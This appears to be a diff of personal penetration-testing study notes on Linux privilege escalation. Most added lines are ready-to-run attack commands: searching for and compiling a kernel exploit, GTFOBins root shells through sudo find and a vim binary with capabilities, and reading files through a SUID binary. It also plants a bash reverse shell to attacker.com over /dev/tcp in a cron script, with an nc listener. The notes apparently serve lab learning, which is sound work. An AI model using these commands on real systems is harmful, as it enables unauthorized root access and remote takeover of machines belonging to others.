@@ -33,10 +33,10 @@ Network Security
 Linux PrivEsc
     * Enumeration
     hostname
-    hostnamectl
-    uname -a
-    /proc/version
-    /etc/issue
+(*) hostnamectl
+(*) uname -a
+(*) cat /proc/version
+    cat /etc/issue
 (*) ls -la
 (*) sudo -l
 (*) find / -perm -u=s -type f 2> /dev/null
@@ -49,7 +49,7 @@ Linux PrivEsc
     Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
     Linux Priv Checker: https://github.com/linted/linuxprivchecker
 
-    * Kernel Exploits
+    * Privilege Escalation: Kernel Exploits
     // search
 (*) searchsploit "linux kernel 3.13"
 (*) searchsploit -m 37292.c
@@ -57,9 +57,36 @@ Linux PrivEsc
 (*) python3 -m http.server
 (*) send through SFTP using WinSCP
     // exec
-    gcc -c 37292.c && ./a.out
+    gcc 37292.c && ./a.out
     
+    * Privilege Escalation: Sudo
+(*) sudo -l
+(*) https://gtfobins.github.io/
+        sudo find . -exec /bin/sh \; -quit
     
+    * Privilege Escalation: SUID
+(*) find / -perm -u=s -type f 2> /dev/null
+(*) https://gtfobins.github.io/
+        LFILE=file_to_read
+        base64 "$LFILE" | base64 --decode
+    
+    * Privilege Escalation: Capabilities
+(*) getcap -r / 2> /dev/null
+(*) https://gtfobins.github.io/
+        ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+    
+    * Privilege Escalation: Cron Jobs
+(*) cat /etc/crontab
+(*) https://gtfobins.github.io/
+    vim backup.sh
+        export RHOST=attacker.com
+        export RPORT=12345
+        bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+    // attacker
+(*) nc -lvnp 12345
+    
+    * Privilege Escalation: PATH
+    find / -writable 2> /dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
     
     
     
